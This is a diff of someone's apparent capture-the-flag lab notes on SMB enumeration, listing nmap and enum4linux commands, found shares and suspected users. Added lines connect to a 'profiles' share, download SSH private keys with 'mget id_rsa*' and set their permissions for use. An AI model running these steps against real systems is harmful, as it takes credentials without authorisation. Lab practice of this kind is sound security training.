@@ -1,12 +1,15 @@
 # Network Services
-Target Machine: 10.10.246.182
+Target Machine: $IP
 
 ## SMB
 
 ### Commands Used 
 ```bash
-nmap --script=smb-os-discovery.nse 10.10.246.182
-enum4linux 10.10.246.182
+nmap --script=smb-os-discovery.nse $IP
+enum4linux $IP
+smbclient //$IP/profiles
+mget id_rsa*
+chmod 600 id_rsa
 ```
 
 ### Information found
@@ -18,3 +21,14 @@ enum4linux 10.10.246.182
 
 OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
 Computer Name: POLOSMB
+
+#### Shares
+- netlogon: network logon service
+- __profiles__: user profiles
+- print$
+- ipc$
+
+#### Suspected users
+POLOSMB/None
+POLOSMB/nobody
+User/cactus
